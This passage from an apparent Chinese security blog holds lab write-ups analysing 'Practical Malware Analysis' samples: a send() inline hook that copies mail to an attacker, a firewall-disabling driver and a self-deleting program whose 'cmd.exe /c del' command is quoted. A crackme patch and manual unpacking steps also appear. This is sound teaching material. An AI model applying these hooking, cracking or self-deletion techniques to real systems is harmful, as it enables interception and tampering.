src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764388157503.png" alt="img"></p><p>发现文件中确实写入了我的账号密码信息，由于笔者未给虚拟机设置密码，所以PW选项中为空</p><p>至此，该实验的所有问题我们均分析完毕！</p><h3 id="Lab11-02"><a href="#Lab11-02" class="headerlink" title="Lab11-02"></a>Lab11-02</h3><p>依旧先以任务导向，我们首先来使用strings等基础工具解决前几个简单问题</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764407985479.png"></p><p>通过strings，我们可以观察到如下信息，其中有典型的三个邮件客户端以及邮件开头报文，并且使用到了CopyFileA操作，以及在注册表中创建新的键值对。我们猜测，该恶意代码的驻留方式便是通过注册表中指定的伪装DLL文件来截获正常DLL库的调用</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764408198439.png"><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764408204445.png"></p><p>接下来还有另一个文件Lab11-02.ini的strings分析，猜测这是一个加密以后的数据</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764408488064.png"></p><p>使用PEID来分析DLL的导出函数，发现Installer，明白这是用来运行恶意代码的函数</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764408705437.png"></p><p>我们使用Lab3所说的rundll32来进行dll的安装，并且使用ProMon同步监视其文件和注册表操作</p><p>注意，由于我们使用的是rundll32.exe来安装代码，因此filter中的进程名应该为rundll32.exe</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764409670929.png"></p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764409625622.png"></p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764409630435.png"></p><p>通过这三个监控片段，可以发现该恶意代码在system32目录下创建了一个spoolvxx32.dll，并且向注册表中写入了AppInit_DLLs的值，同时尝试在system32目录下查询到Lab11-02.ini</p><p>所以我们可以得知Lab11-02.ini应该放在system32目录下，同时查看一下注册表中的对应值，笔者猜测指向开始时创建的spoolvxx32.dll</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764409943062.png"></p><p>发现正如我们所想，同时，我们来验证一下这个dll文件是否就是我们的Lab11-02.dll，使用WinMD5进行MD5校验，发现两者MD5相同，说明为同一文件</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764410417342.png"></p><p>接下来通过IDA对dll文件进行分析，来判断其RootKit技术</p><p>我们跳过Lab11-02.ini的判断过程，直接观察恶意代码部分</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764410749211.png"></p><p>通过上下文可知，sub_100010B3压入ini文件的内容，我们猜测其为解密函数，在ollydbg中动态调试，观察解密结果</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764412098047.png"></p><p>可以看到解密出的字符串是一个邮箱地址，可以推测该程序功能是在你发邮件的时候拷贝一份发往该邮箱</p><p>继续IDA分析，分析返回前调用的最后一个函数sub_100014B6</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764412554015.png"></p><p>首先要判断获取到的模块名是否为这三个之一，如果均不是，直接退出。否则进入下一个子函数sub_100013BD的调用</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764421388836.png"></p><p>记住压栈参数为CurrentProcessID，继续深入，首先加载kernel32库中的OpenThread函数</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764421493665.png"></p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764421499473.png"></p><p>接下来CreateToolhelp32Snapshot为当前所有线程拍一张快照</p><p>遍历所有线程，将当前进程中的所有不是spoolvxx的线程全部挂起，然后返回</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764421569029.png"></p><p>那么我们继续分析顶层中的sub_100012A3函数，它的参数如图所示</p><p>作用是加载wsock32.dll中的send函数，并且使用我们两个指针参数调用子函数sub_10001203,我们继续深入</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764422016699.png"></p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764422118232.png"></p><p>深入以后发现，这个函数才是我们最重要的钩子实现部分，现在笔者将针对代码细细分析</p><p>首先是前几行代码，<code>v6=a2-(lpAddress+5)</code>，实际上是在计算a2也就是我们的恶意代码与钩子跳转处的相对位移（因为jmp xxx本身占据5字节，所以+5）</p><p>接下来是为原始send函数的前5字节附上0x40也就是PAGE_EXECUTE_READWRITE,可读写执行权限，便于后续将jmp指令写入</p><p>然后是创建一个指针指向我们的send函数头，准备开始构造jmp指令</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764422465700.png"></p><p>由于v5是（char*）类型，所以v5[0]-v5[3]中存放的为send函数地址，在第5字节处保存我们覆盖的长度，再将send函数真正的前5字节复制到分配区域准备运行</p><p>后面的操作与上面类似，同样是计算跳转的偏移地址，并且写入jmp指令（0E9）</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764424174649.png"></p><p>再往后的操作就是恢复原本权限，同时让我们的第三个参数指针指向send函数原头部加跳转链的地址，并使返回值为也指向该内存空间</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764424339165.png"></p><p>那么至此，我们的hook构造链便分析完毕了，最后让我们仔细分析一下真正的恶意代码部分</p><p>这一部分就很简单了，如果发送的邮件中含有关键词RCPT TO:的话，就将邮件拦截下来，将目的地更换为攻击者邮箱，先进行一次send，最后再次进行一次send到真正收件人邮箱</p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764424868947.png"></p><p><img src="/2025/11/27/e-yi-dai-ma-fen-xi-shi-zhan-lab11/1764424922085.png"></p><p>那么至此，我们的代码分析过程彻底结束</p><h3 id="Lab11-03"><a href="#Lab11-03" class="headerlink" title="Lab11-03"></a>Lab11-03</h3>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 恶意代码分析实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件保护分析和破解</title>
      <link href="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/"/>
      <url>/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/</url>
      
        <content type="html"><![CDATA[<h3 id="软件保护破解"><a href="#软件保护破解" class="headerlink" title="软件保护破解"></a>软件保护破解</h3><p>crack.exe，该软件逻辑是，输入正确的用户名便返回Good Boy！否则返回Bad Boy！</p><p>现在我们没有正确用户名，随意输几个值，看看软件返回结果</p><p><img src="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/1764144692765.png" alt="程序运行演示"></p><p>由于软件是判断输入内容的正确性，我们直接使用动态分析工具，分析他的跳转逻辑。我们可以查找其程序内所有Strings所在位置，并且观察哪些操作引用了该字符串，从而找到跳转部分</p><p><img src="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/1764145260420.png"></p><p><img src="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/1764145203619.png"></p><p>可以看到此处跳转逻辑使用的是jnz。那么我在不改变PE文件结构的情况下，可以颠倒其逻辑，改为je，应该就可以走到Good Boy！分支了</p><p>经过测试，确实成功弹出Good Boy！</p><p><img src="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/1764145562192.png"></p><p>将修改后的文件保存，运行之，随便输入数据，确实成功破解了</p><p><img src="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/1764145731663.png"></p><p><img src="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/1764145734810.png"></p><h3 id="软件反动态调试分析"><a href="#软件反动态调试分析" class="headerlink" title="软件反动态调试分析"></a>软件反动态调试分析</h3><p>我们首先观察正常情况下运行的软件：首先会跳出CrackME的弹窗，点击以后会向用户显示hello，记下此时的软件操作</p><p><img src="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/1764145873120.png"></p><p>接下来我们尝试使用Ollydbg打开软件，看看他是否具有反动态调试功能，发现F9运行过后没有任何的窗口弹出，而是直接结束运行，因此判断该程序有反动态调试功能</p><p><img src="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/1764146341607.png"></p><p>遇到该功能，我们首先要想到，可能是通过判断父进程名字进行校验的。通常情况下，被我们直接运行的进程应该是由任务管理器explorer.exe打开的。但是通过调试器打开的软件其父进程为调试程序的名字。比如该例，软件父进程名字应该为ollydbg.exe</p><p>于是软件便可以通过判断父进程名字是否为explorer.exe或者是否为最常见的几个调试器，从而确定当前是否为调试状态</p><p><strong>注意，如果你是通过Ollydbg中的File-&gt;Open打开的，那么可能会判定其父进程为explorer，可以直接拖动避免该问题</strong></p><p>又由于软件如果想要获取父进程名字，必不可少的函数便是GetCurrentProcessId了，因此我们在此下断点，进行调试</p><p><img src="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/1764147274873.png"><img src="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/1764147294052.png"></p><p>接下来运行软件，发现第一个断点处操作如下。通过几个函数名，不难看出，此处是在检测程序运行的性能，可能是想通过调试器与主机中的性能差别来检测是否在调试器中运行</p><p><img src="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/1764147483628.png" alt="1764147483628"></p><p>第二个断点处的操作如下，首先通过NtQueryInformationProcess分析当前进程的信息获取父进程有关的信息，然后再后续使用GetModuleFileName获取对应父进程的名字</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 对应的结构体（未公开，但已被逆向）</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_PROCESS_BASIC_INFORMATION</span> <span class="token punctuation">&#123;</span>    PVOID Reserved1<span class="token punctuation">;</span>    PVOID PebBaseAddress<span class="token punctuation">;</span>    PVOID Reserved2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    ULONG_PTR UniqueProcessId<span class="token punctuation">;</span>     <span class="token comment">// 当前进程PID</span>    ULONG_PTR InheritedFromUniqueProcessId<span class="token punctuation">;</span> <span class="token comment">// 父进程PID</span><span class="token punctuation">&#125;</span> PROCESS_BASIC_INFORMATION<span class="token punctuation">;</span><span class="token comment">// 函数调用</span><span class="token function">NtQueryInformationProcess</span><span class="token punctuation">(</span>    hProcess<span class="token punctuation">,</span>                      <span class="token comment">// edi - 当前进程句柄</span>    ProcessBasicInformation<span class="token punctuation">,</span>       <span class="token comment">// 0x0 - 查询基本信息</span>    pInfoBuffer<span class="token punctuation">,</span>                   <span class="token comment">// ecx - 指向接收缓冲区的指针</span>    <span class="token keyword">sizeof</span><span class="token punctuation">(</span>PROCESS_BASIC_INFORMATION<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 0x18=24 字节（结构体大小）</span>    pReturnLength                  <span class="token comment">// edx - 返回实际写入的字节数</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/1764147714518.png" alt="1764147714518"></p><p>获取名字以后将会对父进程名字进行比较，如果有不一样的部分直接退出循环。此时Sub eax,ecx不为0，因此后续不弹窗</p><p><img src="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/1764148883684.png" alt="1764148883684"></p><h3 id="基础手动脱壳"><a href="#基础手动脱壳" class="headerlink" title="基础手动脱壳"></a>基础手动脱壳</h3><p>首先我们将程序放到PEID中进行分析，发现程序带有UDP壳</p><p><img src="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/1764175001728.png"></p><p>接下来我们进入到Ollydbg中对该函数的真正起始点进行分析，发现此处开始时使用了pushad,那么结束该段壳返回到main函数时，也必定会使用popad恢复堆栈</p><p><img src="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/1764175060629.png"></p><p>我们在执行过pushad后，在数据窗口中跟随esp(恢复堆栈时必然会调用该寄存器)，此时在esp处设置一个硬件断点</p><p><img src="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/1764175491214.png"></p><p>然后执行，此时将自动运行到popad的后一条指令处。我们可以发现，正好应该是401000处的main函数</p><p><img src="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/1764175548003.png"></p><p>接下来我们对其脱壳，将入口点地址修改为1000</p><p><img src="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/1764175693722.png"></p><p>将脱完壳后的程序放到PEID中进行分析，果然已经可以去除壳了</p><p><img src="/2025/11/26/ruan-jian-bao-hu-fen-xi-he-po-jie/1764175846117.png" alt="1764175846117"></p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件保护分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意代码分析实战Lab10</title>
      <link href="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/"/>
      <url>/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/</url>
      
        <content type="html"><![CDATA[<p><strong>本章我们将深入到winXP的内核当中，使用Windbg进行令人望而却步的内核调试。但困难终将被克服，让我们开始新的征途吧！</strong></p><h3 id="Lab10-01"><a href="#Lab10-01" class="headerlink" title="Lab10-01"></a>Lab10-01</h3><p>依然，我们采取任务导向方式，首先看一下本次的问题</p><p><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764074172952.png"></p><p>首先，我们依旧借用strings来分析程序的静态特征,我们可以发现exe中使用到了一些关于服务的函数，并且调用了将宽字符转为Unicode的函数。并且我们知道，一般windows内核态会使用Unicode编码，而用户空间使用的是宽字符，因此我们推测这个程序有可能涉及到了内核空间，动态调试要借助windbg了；同时我们也看到了sys文件中的注册表操作函数和一个驱动文件的路径，那么我们更加确定该程序将会进入内核空间了。</p><p><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764080658616.png" alt="Lab10-01.exe"><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764080877321.png" alt="Lab0-01.sys"></p><p>此时其实我们的第一问已经可以回答了，但保险起见，让我们使用Process Monitor观察一下程序的操作吧：可以看到此处使用了RegSetValue函数，由此判断确实改变了注册表的值</p><p><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764081812522.png" alt="1764081812522"></p><p>此时我们先不急着使用windbg，而是利用IDA先对该程序进行初步的分析，先分析EXE文件</p><p><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764083211543.png" alt="1764083211543"></p><p>可以看到我们首先打开了远程管理器。但这些参数的具体意义该如何得知呢？笔者在这里记录一种方法，用于加载windows标准常量</p><p><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764083321183.png" alt="shift+F11打开类型库"></p><p><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764083353580.png" alt="ins加载对应类型库"></p><p><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764083429045.png" alt="右键想要更改的常量，选择标准常量"></p><p>接下来我们便可以一一地把windows的常量加载到程序中了，那么这里的两个0表示连接到本地并且使用默认数据库，同时请求获得所有访问权限</p><p><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764083605728.png"></p><p>接下来我们分析一下后续的操作，首先尝试创建一个Lab10-01服务，运行sys文件；如果服务存在导致创建失败那便直接Open同名服务，然后启动该服务，最后使用controlService停止该服务。这便是exe的主流程了，看来我们还是要着重分析一下sys文件</p><p><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764083812036.png"></p><p>我们进入sys的分析界面以后，可以看到两个跳转，第一个跳转是一个防止栈溢出的函数。如果你熟悉pwn的话，那么该操作其实就是初始化栈中的Canary。第二个跳转便是真正进入Driver主程序的部分</p><p><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764086704840.png"></p><p>反汇编以后可以发现，主函数的作用就是将sub_10486注册到Driver的回调函数，在驱动被卸载的时候使用</p><p><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764086934490.png"></p><p>我们进入回调函数内部分析一下：可以看到，这个函数的主要操作便是创建一系列注册表键，然后对防火墙策略文件进行修改，从而影响防火墙的行为</p><p><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764087202161.png"></p><p>可以看到Valuename为EnableFirewall，而ValueData的值是由edi给出的，但我们的edi在函数开头便初始化为0，所以此处注册表值的作用应该是关闭防火墙</p><p><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764087696018.png"></p><p><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764087804224.png" alt="edi在此处被置为0"></p><p>那么此时第三问其实已经解决了，我们搞清楚了这个程序的作用。将目光转回到第二问上，我们此时来配置VMware使用windbg联调的基本操作</p><p><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764088233976.png" alt="在此处关闭文件隐藏"></p><p>在boot.ini后多加一行debug的配置参数（笔者建议在此之前先拍摄快照，防止无法运行）</p><pre class="line-numbers language-none"><code class="language-none">multi(0)disk(0)rdisk(0)partition(1)\WINDOWS&#x3D;&quot;Microsoft Windows XP Professional with Kernel Debugging&quot; &#x2F;noexecute&#x3D;optin &#x2F;fastdetect &#x2F;debug &#x2F;debugport&#x3D;COM1 &#x2F;baudrate&#x3D;115200<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后我们在虚拟机设置中再新添串口，配置如图所示</p><p><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764090170507.png"></p><p>接下来我们打开windbg，准备连接到WinXP虚拟机，在File中选择kernel debugging，配置如下：</p><p><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764089957959.png"></p><p>启动界面选择我们刚才配置的选项</p><p><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764090070389.png"></p><p>然后观察windbg中的log，发现如下信息，证明已经连接成功了</p><p><img src="/2025/11/25/e-yi-dai-ma-fen-xi-shi-zhan-lab10/1764220003845.png"></p><p>由于恶意程序会在运行结束的时候自动卸载驱动，因此我们若想在windbg中看到该驱动，首先应该使用动态分析方法，运行程序到ControlService之前，通过IDA分析，可知断点应该为bp 00401080</p><p>（鉴于windbg工具问题，本篇暂时停止更新，调试好了以后在进行更新）</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 恶意代码分析实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意代码分析实战Lab9</title>
      <link href="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/"/>
      <url>/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/</url>
      
        <content type="html"><![CDATA[<h3 id="Lab09-01"><a href="#Lab09-01" class="headerlink" title="Lab09-01"></a>Lab09-01</h3><p>该恶意程序是在Lab3中最后一个实验里的可自我删除的程序，先前博客并未涉及，刚好此处使用IDAPro和Ollydbg详细分析一下该程序的行为</p><p>首先，我们依旧使用strings静态分析一下该程序，发现了如下字符串</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763892047903.png"></p><p>可以合理推测该程序会向指定网址发送http报文下载或者上传文件资源，创建服务，伪造系统库文件，以及删除自身，接下来我们进入IDApro中进行详细分析</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763892266994.png" alt="main函数分支"></p><p>可以看到，程序开头先对参数个数进行判断，如果没有参数，便向左边代码块跳转，否则进入右边的执行逻辑。我们初始状态下是没有参数的，因此先步入左边代码块的函数进行分析</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763892571280.png" alt="sub_401000"></p><p>发现了OpenKey和QueryKey这两个参数，可以得知，该函数的作用便是去查询注册表 <code>SOFTWARE\\Microsoft \\XPS\\Configuration</code>项的，如果存在值便返回eax为1，否则clear eax</p><p>可惜，我的XP虚拟机主机中并没有该项注册表，因此我们分析返回为0的结果，此时将会进入函数sub_402410，我们深入分析该函数。由于IDA中将strcpy和strcat等函数直接使用汇编语句进行展示，不便于分析，因此我们此处可以使用IDA反汇编功能，将汇编代码转化成C语言分析（Tab键即可）</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763893179871.png" alt="函数C代码"></p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763893251380.png" alt="执行的命令"></p><p>可以看出来，这里执行了操作 <code>cmd.exe /c del &quot;Filename&quot; &gt;&gt; NUL</code>结合动态分析的行为特征，不难得知，此处是要删除恶意程序本身</p><p>接下来，我们分析一下含有参数的程序运行情况</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763894109931.png"></p><p>首先分析一下压入函数中的参数是什么：根据这一系列转换，不难看出压入了argv[argc-1]中的数据，也就是程序的最后一个参数，接下来我们进入函数</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763894240367.png"></p><p>很简单便可以发现，此处对压入的字符串进行了一系列验证：首先长度要为4，其次首位字母为’a’,次位字母为’a’+1&#x3D;’b’,第三位字母为99&#x3D;’c’,第四位字母为’c’+1&#x3D;’d’，结合这个字符串是原本恶意程序的最后一个参数，不难想到，这是程序的密码。如果读者还不熟悉字符串的操作，无法直接看出来密码，也可以使用python脚本进行分析</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">find_correct_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 逆推结果</span>    a1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">4</span>    a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span>  <span class="token comment"># 第一个字符 'a'</span>    a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 第二个字符 'b'</span>    v2 <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># v2 = 1</span>    a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">99</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span>  <span class="token comment"># 第三个字符 'c'</span>    v3 <span class="token operator">=</span> <span class="token number">99</span> <span class="token operator">*</span> v2  <span class="token comment"># v3 = 99</span>    a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 第四个字符 'd'</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>find_correct_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来我们继续向下分析，根据代码块结构可以发现是一连串的if判断语句，并且可以判断出来,此处是在比较第一个参数选项与指定字符串是否匹配<br><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763895034411.png"></p><p>查看数据，可以得知程序一共有四个选项，分别为 -cc 、-c、 -re和-in，并且如果最后判断均不是的话，将会直接删除自身并退出</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763895234065.png" alt="选项"></p><p>接下来，我们具体分析每个参数选项的行为</p><h5 id="cc"><a href="#cc" class="headerlink" title="-cc"></a>-cc</h5><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763897393392.png"></p><p>该段代码的作用是，将先前注册表中的项目的值分别复制到这几个地址中。接下来，通过下图中的格式化字符print出具体的值</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763897736256.png"></p><h5 id="c"><a href="#c" class="headerlink" title="-c"></a>-c</h5><p>首先是判断输入的参数是否有7个，其次依次将第3、4、5、6个参数压入栈中，作为函数sub_401070的参数</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763897994548.png"></p><p>我们继续深入函数进行分析，可以发现-c与-cc互相呼应，这里的作用便是创建对应注册表项的并且设置其键值，数值分别为压入的参数<br><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763898123990.png"></p><h5 id="re"><a href="#re" class="headerlink" title="-re"></a>-re</h5><p>首先依据参数为3个或4个来进行分支，不满足的直接删除自身并退出</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763898598851.png"></p><p>接下来先判断3个参数的情况，总共调用了两个函数，推测函数一用来为局部变量赋值，函数2用于对该处地址或者句柄进行操作</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763898695742.png"></p><p>深入第一个函数，观察可发现作用为获取当前运行文件的路径并将路径分解为驱动器、目录、文件名和扩展名，并只将文件名存入到先前的局部参数中</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763898856821.png"></p><p>在观察第二个函数，发现它先删除了对应的服务项目，然后通过调用函数等一系列操作又删除了注册表中的值以及根目录下的程序</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763899286265.png" alt="删除服务"></p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763899612608.png" alt="删除文件"></p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763899619412.png" alt="删除注册表"></p><p>那么结合我们的分析，不难猜出，这个参数选项的作用便是完全卸载该恶意程序，同理，参数为4的情况便是指定文件了</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763899792754.png" alt="将压入的局部参数替换为命令行参数"></p><h5 id="in"><a href="#in" class="headerlink" title="-in"></a>-in</h5><p>经过我们上面这么多步骤的分析，不难想到，这一个选项便是”install”了，但我们依然分析一下安装过程它做了哪些操作。同样的参数为3、4两种分支，但结合-re的过程，不难猜出4个参数便是指定了文件名，因此，我们只分析3参数情况便够了。</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763900030559.png"></p><p>此时我们只需要分析sub_402600便可，其他函数先前均已分析过了，我们深入该函数分析</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763900646086.png"></p><p>可见其作用是创建服务项，依据服务指定位置，修改环境变量和拷贝对应源程序，并且将该程序的时间戳修改至与kernel32.dll时间戳一致。最后设置注册表值。</p><p>既然此时我们已经有了注册表中对应的值了，那么我们回头来看刚才略过的默认执行方案，进入剩下的函数分析，可以发现这是一个依据注册表中值来采取不同网络操作的函数</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763901282451.png"></p><p>我们的静态分析到此结束，接下来使用ollydbg进行上述功能的验证，我们首先使用-in选项安装该程序</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763901383522.png"></p><p>接下来我们会发现程序的入口点并不在main函数处，而是位于PE文件指定的入口点。我们根据IDA的分析可以得知，main函数位于0x402AF0，因此我们只需要进入call 0x402AF0操作的内部便可以了</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763901634984.png" alt="IDA的分析"></p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763901622766.png" alt="步入main函数"></p><p>此时我们根据IDA内的代码地址，选取几个调试的关键断点，用于判断我们刚才的静态分析是否正确，首先检验密码是否正确</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763901904989.png" alt="通过verify函数"></p><p>接下来检查install后是否存在相应的注册表值、服务等等一系列特征</p><p><img 